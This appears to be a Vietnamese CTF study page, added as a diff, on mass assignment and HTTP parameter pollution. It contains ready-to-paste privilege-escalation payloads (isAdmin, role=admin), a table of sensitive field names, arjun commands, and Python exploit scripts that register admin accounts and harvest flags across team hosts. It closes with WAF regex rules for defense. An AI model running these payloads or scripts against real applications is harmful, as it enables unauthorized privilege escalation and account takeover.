@@ -1,0 +1,543 @@
+<title>Mass Assignment &amp; HTTP Parameter Pollution — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Access Control &amp; Business Logic</div>
+    <h1>Mass Assignment &amp; HTTP Parameter Pollution</h1>
+    <p class="sub">Khi server nhận 1 object từ request (form đăng ký, cập nhật hồ sơ) và gán <strong>TẤT CẢ</strong>
+    field gửi lên thẳng vào bản ghi database — bạn có thể tự thêm field server không mong đợi (như
+    <code>isAdmin: true</code>) để tự nâng quyền. HTTP Parameter Pollution (HPP) là một biến thể: gửi
+    <strong>trùng tên tham số nhiều lần</strong> để lợi dụng việc các tầng xử lý (WAF, app) đọc giá trị khác nhau.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Mass Assignment &amp; HPP là gì, để làm gì?</h2>
+  <p class="lead"><strong>Mass Assignment</strong>: nhiều framework hiện đại (đặc biệt ORM) có tiện ích "nhận
+  cả object JSON/form rồi tự gán hết vào model" cho nhanh, thay vì lập trình viên tự chỉ định từng field một.
+  Nếu lập trình viên không giới hạn field nào được phép, bạn gửi kèm 1 field "lạ" (không hiện trên giao diện) và
+  nó vẫn được gán thẳng vào bản ghi — kể cả field nhạy cảm như quyền hạn. <strong>HTTP Parameter Pollution</strong>:
+  gửi cùng 1 tên tham số 2 lần trong 1 request — các thành phần khác nhau (WAF, load balancer, app server) có thể
+  mỗi bên lấy giá trị KHÁC NHAU (cái đầu tiên hay cái cuối cùng), tạo ra khoảng trống để lách luật.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Luôn thử gửi kèm field <code>isAdmin</code>/<code>is_admin</code>/<code>role</code>/<code>admin</code> trong
+  body của BẤT KỲ request tạo/sửa dữ liệu nào (đăng ký, cập nhật hồ sơ) — kể cả khi giao diện không có ô nào cho
+  field đó. Chi phí thử gần như bằng 0, nhiều app dính lỗi này.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ MASS ASSIGNMENT / HPP</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Có form đăng ký/sửa hồ sơ gửi JSON hoặc form-data. Thêm field <code>"isAdmin": true</code> (JSON) hoặc
+        <code>role=admin</code> (form) vào body → nếu account được tạo/sửa với quyền admin ⟹ Mass Assignment
+        xác nhận.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Có 1 request tạo/sửa bản ghi (đăng ký, cập nhật profile, tạo order). Biết hoặc đoán được tên field nhạy
+        cảm (xem response trả về — thường trả lại nguyên object, lộ tên field thật).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Repeater: thêm field nghi ngờ vào body, Send, kiểm tra Response (object trả về) có field đó không và giá
+        trị có đúng như bạn gửi không.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c">// 1. Mass Assignment qua JSON (thêm field server không mong đợi)</span>
+POST /register
+{"username":"x","password":"y","isAdmin":true}
+
+<span class="c"># 2. HTTP Parameter Pollution (gửi trùng tên tham số)</span>
+POST /update-role
+role=user&amp;role=admin
+
+<span class="c"># 3. Mass Assignment lồng (nested, khi server dùng ORM tự động sâu hơn)</span>
+{"username":"x","profile":{"role":"admin"}}</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+html = requests.post(<span class="s">"http://TARGET/register"</span>, json={
+    <span class="s">"username"</span>: <span class="s">"pwn"</span>, <span class="s">"password"</span>: <span class="s">"pwn123"</span>, <span class="s">"isAdmin"</span>: <span class="k">True</span>
+}).text
+<span class="k">print</span>(re.search(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>, html).group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Tên field đoán sai → dùng <code>arjun</code> dò tên field ẩn (mục 07). HPP: thử cả 2 thứ tự (giá trị độc
+        trước/sau) vì mỗi server lấy giá trị khác nhau. WAF rule nhanh: chặn body có field blacklist
+        (<code>isAdmin</code>, <code>role.*admin</code>) ở endpoint đăng ký công khai. Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Model / ORM</b> — lớp code đại diện cho 1 bảng database (vd model <code>User</code> có các
+  field <code>username</code>, <code>password</code>, <code>is_admin</code>). ORM (Object-Relational Mapping) là
+  thư viện giúp thao tác database thông qua object thay vì viết SQL tay.</div>
+  <div class="def"><b>Mass assignment (gán hàng loạt)</b> — tính năng tiện lợi của nhiều ORM: nhận 1 dict/object
+  rồi tự gán <strong>mọi key khớp tên field</strong> vào model cùng lúc, ví dụ Python <code>User(**request.json)</code>
+  hoặc một số ORM có hàm <code>update_from_dict()</code>.</div>
+  <div class="def"><b>HTTP Parameter Pollution (HPP)</b> — gửi cùng 1 tên tham số nhiều lần trong URL/body
+  (<code>?role=user&amp;role=admin</code>). Mỗi ngôn ngữ/framework có quy tắc khác nhau khi gặp trường hợp này:
+  một số lấy giá trị <strong>đầu tiên</strong>, số khác lấy <strong>cuối cùng</strong>, số khác gộp thành
+  <strong>mảng</strong>.</div>
+  <p>Code hay viết (tiện lợi nhưng nguy hiểm):</p>
+  <pre><code><span class="c"># Python/Flask — nhận toàn bộ JSON rồi tạo user, KHÔNG lọc field nào được phép</span>
+data = request.get_json()
+user = User(**data)   <span class="c"># nếu data có "is_admin": true, field này cũng được gán!</span>
+db.session.add(user)</code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Tiện lợi cho lập trình viên = nguy hiểm cho bảo mật</h2>
+  <p>Viết <code>User(**data)</code> nhanh gọn hơn nhiều so với liệt kê tay từng field
+  (<code>User(username=data['username'], password=data['password'])</code>) — nhất là khi model có nhiều field.
+  Lập trình viên (đặc biệt làm nhanh cho demo/CTF) hay chọn cách viết tắt này mà quên rằng <strong>object request
+  hoàn toàn do người dùng kiểm soát</strong> — họ có thể gửi bất kỳ key nào, không chỉ những key có ô nhập trên
+  giao diện.</p>
+  <p>Với HPP, nguyên nhân là <strong>không có chuẩn thống nhất</strong> trong đặc tả HTTP về việc tham số trùng
+  tên nên xử lý thế nào — mỗi ngôn ngữ/framework tự quyết định, dẫn tới việc 2 tầng xử lý khác nhau trong cùng hệ
+  thống (vd WAF kiểm tra giá trị đầu, app thực sự dùng giá trị cuối) có thể "nhìn thấy" 2 giá trị khác nhau của
+  cùng 1 tham số.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Thêm 1 field lạ, server tự gán vào database</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr10)}
+    </style>
+    <defs><marker id="arr10" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="210" height="65" rx="10" class="box-a"/>
+    <text x="22" y="38" class="lbl-m">Body bạn gửi:</text>
+    <text x="22" y="54" class="lbl">{"username":"x",</text>
+    <text x="22" y="68" class="lbl-a">"isAdmin": true}</text>
+
+    <path d="M220,52 H258" class="arrow"/>
+    <rect x="263" y="20" width="195" height="65" rx="10" class="box"/>
+    <text x="275" y="38" class="lbl-m">Server: User(**data)</text>
+    <text x="275" y="54" class="lbl">gán MỌI key, không lọc</text>
+    <text x="275" y="68" class="lbl-a">username, isAdmin đều được gán</text>
+
+    <path d="M360,90 V115" class="arrow"/>
+    <rect x="263" y="120" width="195" height="55" rx="10" class="box-a"/>
+    <text x="275" y="140" class="lbl-m">Database lưu:</text>
+    <text x="275" y="156" class="lbl-a">user.isAdmin = true</text>
+
+    <path d="M263,145 H90" class="arrow"/>
+    <rect x="10" y="120" width="200" height="55" rx="10" class="box-a"/>
+    <text x="22" y="140" class="lbl-m">Đăng nhập lại</text>
+    <text x="22" y="156" class="lbl-a">-&gt; có quyền admin!</text>
+  </svg>
+  </div>
+  <p>Điểm quan trọng: bạn <strong>không cần biết</strong> tên field chính xác 100% ngay từ đầu — Response của
+  request tạo/sửa thường <strong>trả lại nguyên object vừa tạo</strong> (kể cả field bạn không gửi), giúp bạn
+  "nhìn trộm" được tên field thật để thử lại chính xác ở request tiếp theo. Đây là kỹ thuật dò field bằng chính
+  response của app, không cần công cụ ngoài.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Request đăng ký/sửa hồ sơ gửi JSON (không phải form đơn giản)</td><td>Khả năng cao dùng ORM mass-assign trực tiếp từ JSON</td></tr>
+    <tr><td>Response trả về object đầy đủ (nhiều field hơn những gì có trên giao diện)</td><td>Lộ tên field thật để thử gửi lại</td></tr>
+    <tr><td>Có 2 vai trò user/admin nhưng đăng ký chỉ có form user thường</td><td>Thử thêm field role/admin vào request đăng ký</td></tr>
+    <tr><td>App có sẵn WAF/proxy ở giữa (đặc thù A/D)</td><td>Thử HPP — gửi trùng tham số xem WAF và app có đọc khác nhau không</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Bước 1-2 — bắt request đăng ký, thêm field</span>
+  <ol style="margin:4px 0 0">
+    <li>Burp bắt request đăng ký/sửa hồ sơ bình thường.</li>
+    <li>Send to Repeater, thêm field nghi ngờ vào JSON body: <code>"isAdmin": true</code> (lưu ý: phải đúng cú
+    pháp JSON hợp lệ — thêm dấu phẩy đúng chỗ).</li>
+    <li>Send, đọc Response — xem field đó có xuất hiện trong object trả về với đúng giá trị <code>true</code>
+    không.</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Thử HPP</span>
+  Trong Repeater, thêm tham số trùng tên: <code>role=user&amp;role=admin</code> — Send, kiểm tra kết quả. Thử
+  luôn thứ tự ngược lại (<code>role=admin&amp;role=user</code>) vì có framework lấy giá trị đầu, có framework lấy
+  giá trị cuối.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Các tên field/kỹ thuật hay gặp</h2>
+
+  <h3>A. Tên field hay thử cho Mass Assignment</h3>
+  <table>
+    <tr><th>Field</th><th>Giá trị thử</th></tr>
+    <tr><td><code>isAdmin</code> / <code>is_admin</code></td><td><code>true</code></td></tr>
+    <tr><td><code>role</code></td><td><code>"admin"</code></td></tr>
+    <tr><td><code>admin</code></td><td><code>true</code> hoặc <code>1</code></td></tr>
+    <tr><td><code>permissions</code> / <code>scope</code></td><td><code>"*"</code> hoặc <code>["admin"]</code></td></tr>
+    <tr><td><code>verified</code> / <code>email_verified</code></td><td><code>true</code> (bypass bước xác thực email)</td></tr>
+    <tr><td><code>balance</code> / <code>credits</code> / <code>points</code></td><td>Số lớn tùy ý (business logic — nếu challenge có "cửa hàng")</td></tr>
+    <tr><td><code>user_id</code> / <code>owner_id</code></td><td>ID của nạn nhân khác (kết hợp IDOR qua mass assignment)</td></tr>
+  </table>
+
+  <h3>B. Mass Assignment lồng (nested)</h3>
+  <pre><code>{"username": "x", "profile": {"role": "admin"}}
+{"username": "x", "settings": {"permissions": ["admin"]}}</code></pre>
+  <div class="note">Một số ORM chỉ lọc field cấp 1 (top-level) nhưng tự động gán sâu vào object lồng bên trong —
+  đáng thử nếu field cấp 1 bị chặn.</div>
+
+  <h3>C. HTTP Parameter Pollution — theo vị trí</h3>
+  <table>
+    <tr><th>Vị trí</th><th>Payload mẫu</th></tr>
+    <tr><td>Query string</td><td><code>?role=user&amp;role=admin</code></td></tr>
+    <tr><td>Form body</td><td><code>role=user&amp;role=admin</code> (cùng cú pháp, khác Content-Type)</td></tr>
+    <tr><td>JSON (ít gặp HPP theo nghĩa cổ điển, nhưng thử key trùng)</td><td><code>{"role":"user","role":"admin"}</code> — JSON parser thường chỉ giữ key cuối, nhưng đáng thử nếu có 2 tầng parse khác nhau</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: ARJUN &amp; KHO PAYLOAD</div>
+  <h2>Không đoán được tên field? Dùng arjun dò tự động</h2>
+
+  <h3>A. Kho payload offline</h3>
+  <p><code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Mass Assignment/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/HTTP Parameter Pollution/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Hidden Parameters/</code> — danh sách tên field/tham số phổ biến dài
+  hơn bảng ở mục 06.</p>
+
+  <h3>B. arjun — dò tên field ẩn tự động (đã cài sẵn, giống bài IDOR)</h3>
+  <pre><code><span class="c"># Dò tham số ẩn trên chính endpoint đăng ký/sửa hồ sơ</span>
+arjun -u <span class="s">"http://TARGET/register"</span> -m JSON
+
+<span class="c"># Có thể cần truyền 1 JSON mẫu để arjun biết cấu trúc gốc</span>
+arjun -u <span class="s">"http://TARGET/update-profile"</span> -m JSON --headers <span class="s">"Cookie: session=..."</span></code></pre>
+  <div class="note tip"><span class="tag">Mẹo</span>arjun vốn thiết kế để dò tham số ẩn nói chung (không riêng
+  Mass Assignment) — dùng kết quả của nó làm danh sách ứng viên, rồi tự tay thử từng cái với giá trị nhạy cảm
+  (<code>true</code>, <code>"admin"</code>) vì arjun không tự biết giá trị nào đáng thử.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET/register"</span>
+
+<span class="c"># Bước 1: đăng ký thường, xem response lộ field gì</span>
+r = requests.post(url, json={<span class="s">"username"</span>: <span class="s">"test1"</span>, <span class="s">"password"</span>: <span class="s">"test123"</span>})
+<span class="k">print</span>(r.json())   <span class="c"># tìm field lạ trong response (vd "is_admin": false)</span>
+
+<span class="c"># Bước 2: thử gán field đó thành true</span>
+r = requests.post(url, json={<span class="s">"username"</span>: <span class="s">"test2"</span>, <span class="s">"password"</span>: <span class="s">"test123"</span>, <span class="s">"is_admin"</span>: <span class="k">True</span>})
+<span class="k">print</span>(r.json())</code></pre>
+
+  <h3>(B) Bản gọn chắc — thử nhiều tên field, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+FIELD_NAMES = [<span class="s">"isAdmin"</span>, <span class="s">"is_admin"</span>, <span class="s">"admin"</span>, <span class="s">"role"</span>]
+
+<span class="k">def</span> <span class="d">exploit_mass_assignment</span>(host):
+    <span class="k">for</span> field <span class="k">in</span> FIELD_NAMES:
+        data = {<span class="s">"username"</span>: <span class="s">f"pwn_{field}"</span>, <span class="s">"password"</span>: <span class="s">"pwn123"</span>, field: <span class="k">True</span> <span class="k">if</span> field != <span class="s">"role"</span> <span class="k">else</span> <span class="s">"admin"</span>}
+        r = requests.post(<span class="s">f"http://{host}/register"</span>, json=data, timeout=5)
+        <span class="c"># đăng nhập lại ngay, xem trang admin có hiện flag không</span>
+        s = requests.Session()
+        s.post(<span class="s">f"http://{host}/login"</span>, json={<span class="s">"username"</span>: data[<span class="s">"username"</span>], <span class="s">"password"</span>: <span class="s">"pwn123"</span>}, timeout=5)
+        check = s.get(<span class="s">f"http://{host}/admin"</span>, timeout=5)
+        m = FLAG_RE.search(check.text)
+        <span class="k">if</span> m:
+            <span class="k">return</span> m.group()
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_mass_assignment(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+FIELD = <span class="s">"isAdmin"</span>   <span class="c"># đã xác nhận field ăn từ bước thử tay</span>
+
+<span class="k">def</span> <span class="d">exploit_mass_assignment</span>(host):
+    <span class="k">try</span>:
+        s = requests.Session()
+        s.post(<span class="s">f"http://{host}/register"</span>,
+                json={<span class="s">"username"</span>: <span class="s">"pwn_ad"</span>, <span class="s">"password"</span>: <span class="s">"pwn123"</span>, FIELD: <span class="k">True</span>}, timeout=5)
+        s.post(<span class="s">f"http://{host}/login"</span>, json={<span class="s">"username"</span>: <span class="s">"pwn_ad"</span>, <span class="s">"password"</span>: <span class="s">"pwn123"</span>}, timeout=5)
+        r = s.get(<span class="s">f"http://{host}/admin"</span>, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_mass_assignment(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service cho đăng ký tài khoản qua JSON <code>POST /register {"username","password"}</code>.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Lộ field</div><div class="d">Response trả về <code>{"username":"x","password":"***","is_admin":false,"id":5}</code> ⟹ lộ tên field <code>is_admin</code>.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Khai thác</div><div class="d">Đăng ký lại, thêm <code>"is_admin": true</code> vào body → Response trả về <code>"is_admin":true</code> ⟹ Mass Assignment xác nhận.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Lấy flag</div><div class="d">Đăng nhập tài khoản vừa tạo, vào <code>/admin</code> → thấy <code>FHACKER2026{...}</code>.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex, soi body JSON/form)</th><th>Khớp gì</th></tr>
+    <tr><td><code>"is_?[Aa]dmin"\s*:\s*true</code></td><td>Field admin phổ biến được gán true trong JSON</td></tr>
+    <tr><td><code>"role"\s*:\s*"admin"</code></td><td>Field role bị gán giá trị admin</td></tr>
+  </table>
